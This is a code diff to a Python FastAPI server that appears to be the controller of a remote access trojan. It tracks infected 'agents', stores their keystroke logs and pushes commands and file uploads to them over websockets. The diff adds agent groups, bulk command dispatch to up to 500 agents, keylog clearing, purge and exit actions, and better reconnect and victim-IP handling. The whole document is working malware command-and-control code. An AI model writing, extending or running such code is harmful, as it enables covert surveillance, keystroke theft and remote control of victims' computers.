@@ -11,6 +11,7 @@ import hashlib
 import hmac
 import json
 import os
+import re
 import secrets
 import sqlite3
 import time
@@ -102,6 +103,9 @@ CREATE TABLE IF NOT EXISTS keylogs(
   id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, ts REAL, text TEXT
 );
 CREATE INDEX IF NOT EXISTS ix_keylog ON keylogs(agent_id, ts DESC);
+CREATE TABLE IF NOT EXISTS groups(
+  name TEXT PRIMARY KEY, color TEXT, created REAL
+);
 """
 
 
@@ -131,6 +135,73 @@ def x(sql: str, params: tuple = ()) -> None:
     with db() as con:
         con.execute(sql, params)
         con.commit()
+
+
+# --------------------------------------------------------------------------
+# groups
+# --------------------------------------------------------------------------
+GROUP_COLORS = ["#6366f1", "#22c55e", "#f59e0b", "#ec4899", "#06b6d4",
+                "#a855f7", "#ef4444", "#84cc16", "#f97316", "#14b8a6"]
+
+GROUP_NAME_MAX = 64
+
+
+def clean_group(name: Any) -> str:
+    """Group names end up in URLs and markup — keep them boring."""
+    text = "".join(ch for ch in str(name or "") if ch >= " " and ch not in "/\\")
+    return text.strip()[:GROUP_NAME_MAX]
+
+
+def group_color(name: str) -> str:
+    digest = int(hashlib.sha1(name.encode("utf-8")).hexdigest(), 16)
+    return GROUP_COLORS[digest % len(GROUP_COLORS)]
+
+
+COLOR_RE = re.compile(r"#[0-9a-fA-F]{3,8}")
+
+
+def clean_color(value: Any, name: str) -> str:
+    """Colors are inlined into styles — accept only plain hex."""
+    text = str(value or "").strip()
+    return text.lower() if COLOR_RE.fullmatch(text) else group_color(name)
+
+
+def ensure_group(name: str, color: str | None = None) -> str | None:
+    name = clean_group(name)
+    if not name:
+        return None
+    color = clean_color(color, name) if color else None
+    existing = q("SELECT color FROM groups WHERE name=?", (name,))
+    if existing:
+        if color:
+            x("UPDATE groups SET color=? WHERE name=?", (color, name))
+        return name
+    x("INSERT INTO groups(name,color,created) VALUES(?,?,?)",
+      (name, color or group_color(name), time.time()))
+    return name
+
+
+def groups_payload() -> list[dict]:
+    rows = q("SELECT name,color,created FROM groups ORDER BY created ASC, name ASC")
+    labels = {r["grp"] for r in q(
+        "SELECT DISTINCT grp FROM agents WHERE grp IS NOT NULL AND grp<>''")}
+    for name in labels:
+        if name not in {r["name"] for r in rows}:
+            ensure_group(name)
+    rows = q("SELECT name,color,created FROM groups ORDER BY created ASC, name ASC")
+    counts: dict[str, dict] = {}
+    for r in q("SELECT grp, COUNT(*) AS total FROM agents "
+               "WHERE grp IS NOT NULL AND grp<>'' GROUP BY grp"):
+        counts[r["grp"]] = {"total": r["total"], "online": 0}
+    for r in q("SELECT grp, id FROM agents WHERE grp IS NOT NULL AND grp<>''"):
+        if r["id"] in LIVE and r["grp"] in counts:
+            counts[r["grp"]]["online"] += 1
+    out = []
+    for r in rows:
+        c = counts.get(r["name"], {"total": 0, "online": 0})
+        out.append({"name": r["name"], "color": clean_color(r["color"], r["name"]),
+                    "count": c["total"], "online": c["online"], "created": r["created"]})
+    return out
 
 
 # --------------------------------------------------------------------------
@@ -308,6 +379,7 @@ async def api_state():
     rows = q("SELECT id FROM agents ORDER BY last_seen DESC")
     return {
         "agents": [c for c in (card(r["id"]) for r in rows) if c],
+        "groups": groups_payload(),
         "online": len(LIVE),
         "ts": time.time(),
     }
@@ -317,6 +389,126 @@ async def api_state():
 async def api_agents():
     rows = q("SELECT id FROM agents ORDER BY last_seen DESC")
     return {"agents": [c for c in (card(r["id"]) for r in rows) if c]}
+
+
+# --------------------------------------------------------------------------
+# groups api
+# --------------------------------------------------------------------------
+@app.get("/api/groups", dependencies=[Depends(require_panel)])
+async def api_groups():
+    return {"groups": groups_payload()}
+
+
+@app.post("/api/groups", dependencies=[Depends(require_panel)])
+async def api_group_create(body: dict):
+    name = clean_group(body.get("name"))
+    if not name:
+        raise HTTPException(400, "group name required")
+    color = str(body.get("color") or "")[:16] or None
+    if q("SELECT 1 FROM groups WHERE name=?", (name,)):
+        raise HTTPException(409, "group already exists")
+    ensure_group(name, color)
+    payload = groups_payload()
+    await pub({"t": "groups", "groups": payload})
+    return {"ok": True, "groups": payload}
+
+
+@app.patch("/api/groups/{name}", dependencies=[Depends(require_panel)])
+async def api_group_update(name: str, body: dict):
+    name = clean_group(name)
+    if not q("SELECT 1 FROM groups WHERE name=?", (name,)):
+        raise HTTPException(404, "no such group")
+    rename = clean_group(body.get("name")) if "name" in body else ""
+    color = clean_color(body.get("color"), name) if "color" in body else ""
+    if rename and rename != name:
+        if q("SELECT 1 FROM groups WHERE name=?", (rename,)):
+            raise HTTPException(409, "target group already exists")
+        color = color or (q("SELECT color FROM groups WHERE name=?", (name,))[0]["color"])
+        x("UPDATE agents SET grp=? WHERE grp=?", (rename, name))
+        x("DELETE FROM groups WHERE name=?", (name,))
+        ensure_group(rename, color)
+    elif color:
+        x("UPDATE groups SET color=? WHERE name=?", (color, name))
+    payload = groups_payload()
+    await pub({"t": "groups", "groups": payload})
+    await pub({"t": "refresh"})
+    return {"ok": True, "groups": payload}
+
+
+@app.delete("/api/groups/{name}", dependencies=[Depends(require_panel)])
+async def api_group_delete(name: str):
+    name = clean_group(name)
+    x("UPDATE agents SET grp='' WHERE grp=?", (name,))
+    x("DELETE FROM groups WHERE name=?", (name,))
+    payload = groups_payload()
+    await pub({"t": "groups", "groups": payload})
+    await pub({"t": "refresh"})
+    return {"ok": True, "groups": payload}
+
+
+@app.post("/api/bulk", dependencies=[Depends(require_panel)])
+async def api_bulk(body: dict):
+    ids = [str(i)[:64] for i in (body.get("ids") or [])][:500]
+    if not ids:
+        raise HTTPException(400, "ids required")
+    action = str(body.get("action") or "")[:32]
+
+    if "grp" in body:
+        grp = clean_group(body.get("grp"))
+        if grp:
+            ensure_group(grp)
+        for aid in ids:
+            x("UPDATE agents SET grp=? WHERE id=?", (grp, aid))
+        await pub({"t": "groups", "groups": groups_payload()})
+
+    if "pinned" in body:
+        val = 1 if body.get("pinned") else 0
+        for aid in ids:
+            x("UPDATE agents SET pinned=? WHERE id=?", (val, aid))
+
+    if action in ("delete", "purge"):
+        for aid in ids:
+            sess = LIVE.pop(aid, None)
+            if sess:
+                try:
+                    await sess.ws.close(code=1000)
+                except Exception:
+                    pass
+            if action == "purge" or body.get("purge"):
+                for table, column in (("agents", "id"), ("commands", "agent_id"),
+                                      ("files", "agent_id"), ("keylogs", "agent_id")):
+                    x(f"DELETE FROM {table} WHERE {column}=?", (aid,))
+                await pub({"t": "agent", "agent": {"id": aid, "online": False, "removed": True}})
+
+    elif action == "exit":
+        for aid in ids:
+            sess = LIVE.get(aid)
+            if not sess:
+                continue
+            cid = uuid.uuid4().hex
+            await sess.queue.put({"type": "cmd", "id": cid, "module": "exit", "args": {}})
+
+    elif action == "cmd":
+        module = str(body.get("module") or "")[:64]
+        args = body.get("args") or {}
+        if not module or not isinstance(args, dict):
+            raise HTTPException(400, "module required")
+        sent = 0
+        for aid in ids:
+            sess = LIVE.get(aid)
+            if not sess:
+                continue
+            cid = uuid.uuid4().hex
+            x("INSERT INTO commands(id,agent_id,module,args,created,status) "
+              "VALUES(?,?,?,?,?,'queued')",
+              (cid, aid, module, json.dumps(args), time.time()))
+            await sess.queue.put({"type": "cmd", "id": cid, "module": module, "args": args})
+            sent += 1
+        await pub({"t": "refresh"})
+        return {"ok": True, "sent": sent}
+
+    await pub({"t": "refresh"})
+    return {"ok": True, "count": len(ids)}
 
 
 @app.get("/api/agents/{aid}", dependencies=[Depends(require_panel)])
@@ -346,8 +538,11 @@ async def api_agent_meta(aid: str, body: dict):
         raise HTTPException(400, "nothing to update")
     sets = ",".join(f"{k}=?" for k in fields)
     x(f"UPDATE agents SET {sets} WHERE id=?", (*fields.values(), aid))
+    if fields.get("grp"):
+        ensure_group(fields["grp"])
     c = card(aid)
     await pub({"t": "agent", "agent": c})
+    await pub({"t": "groups", "groups": groups_payload()})
     return {"ok": True, "agent": c}
 
 
@@ -407,6 +602,12 @@ async def api_keylogs(aid: str):
     return {"logs": q("SELECT ts,text FROM keylogs WHERE agent_id=? ORDER BY id ASC LIMIT 5000", (aid,))}
 
 
+@app.delete("/api/agents/{aid}/keylogs", dependencies=[Depends(require_panel)])
+async def api_keylogs_clear(aid: str):
+    x("DELETE FROM keylogs WHERE agent_id=?", (aid,))
+    return {"ok": True}
+
+
 @app.delete("/api/agents/{aid}", dependencies=[Depends(require_panel)])
 async def api_delete(aid: str, purge: bool = False):
     sess = LIVE.pop(aid, None)
@@ -416,10 +617,11 @@ async def api_delete(aid: str, purge: bool = False):
         except Exception:
             pass
     if purge:
-        for table in ("agents", "commands", "files", "keylogs"):
-            x(f"DELETE FROM {table} WHERE id=?" if table == "agents" else f"DELETE FROM {table} WHERE agent_id=?",
-              (aid,))
+        for table, column in (("agents", "id"), ("commands", "agent_id"),
+                              ("files", "agent_id"), ("keylogs", "agent_id")):
+            x(f"DELETE FROM {table} WHERE {column}=?", (aid,))
     await pub({"t": "agent", "agent": {"id": aid, "online": False, "removed": purge}})
+    await pub({"t": "groups", "groups": groups_payload()})
     return {"ok": True}
 
 
@@ -436,8 +638,9 @@ async def api_upload(aid: str, path: str = Form(...), file: UploadFile = File(..
         cid = uuid.uuid4().hex
         args = {"path": path, "tid": tid, "seq": i, "total": total,
                 "data": base64.b64encode(part).decode()}
+        slim = {"path": path, "tid": tid, "seq": i, "total": total, "size": len(part)}
         x("INSERT INTO commands(id,agent_id,module,args,created,status) VALUES(?,?,?,?,?,'queued')",
-          (cid, aid, "upload", json.dumps(args), time.time()))
+          (cid, aid, "upload", json.dumps(slim), time.time()))
         await sess.queue.put({"type": "cmd", "id": cid, "module": "upload", "args": args})
         if total > 1:
             await pub({"t": "progress", "agent_id": aid, "xid": tid,
@@ -508,9 +711,13 @@ async def agent_ws(ws: WebSocket):
 
     async def sender():
         assert sess
-        while True:
-            msg = await sess.queue.get()
-            await ws.send_text(json.dumps(msg, separators=(",", ":")))
+        try:
+            while True:
+                msg = await sess.queue.get()
+                await ws.send_text(json.dumps(msg, separators=(",", ":")))
+        except Exception:
+            # socket gone — the receive loop owns cleanup
+            return
 
     async def pinger():
         assert sess
@@ -540,22 +747,42 @@ async def agent_ws(ws: WebSocket):
             text = frame.get("text")
             if not text:
                 continue
-            msg = json.loads(text)
+            try:
+                msg = json.loads(text)
+            except Exception:
+                continue
+            if not isinstance(msg, dict):
+                continue
             kind = msg.get("type")
 
             if kind == "hello":
                 aid = str(msg.get("agent_id") or uuid.uuid4().hex)[:64]
                 if sess is None:
                     sess = AgentSession(aid, ws)
+                    prev = LIVE.get(aid)
+                    if prev is not None and prev is not sess:
+                        # the same agent reconnected before the old socket died
+                        try:
+                            await prev.ws.close(code=1000)
+                        except Exception:
+                            pass
                     LIVE[aid] = sess
                     send_task = asyncio.create_task(sender())
                     ping_task = asyncio.create_task(pinger())
+                elif sess.id != aid:
+                    continue
                 sess.info = msg
                 sess.last_seen = time.time()
                 now = time.time()
                 meta = {k: v for k, v in msg.items()
                         if k in ("os_short", "cpu", "ram", "gpu", "monitors", "ver", "tag", "domain")}
-                ip = ws.client.host if ws.client else None
+                fwd = (ws.headers.get("x-forwarded-for") or "").split(",")[0].strip()
+                lan = ""
+                for v in (msg.get("ips") or []):
+                    if isinstance(v, str) and v.strip():
+                        lan = v.strip()
+                        break
+                ip = fwd or lan or (ws.client.host if ws.client else None)
                 x("""INSERT INTO agents(id,host,user,os,arch,pid,admin,ip,first_seen,last_seen,meta)
                      VALUES(?,?,?,?,?,?,?,?,?,?,?)
                      ON CONFLICT(id) DO UPDATE SET host=excluded.host,user=excluded.user,
@@ -607,6 +834,9 @@ async def agent_ws(ws: WebSocket):
         for task in (send_task, ping_task):
             if task:
                 task.cancel()
+        stale = [k for k in list(XFERS) if sess and k.startswith(f"{sess.id}:")]
+        for key in stale:
+            XFERS.pop(key, None)
         if sess and LIVE.get(sess.id) is sess:
             LIVE.pop(sess.id, None)
             x("UPDATE agents SET last_seen=? WHERE id=?", (time.time(), sess.id))
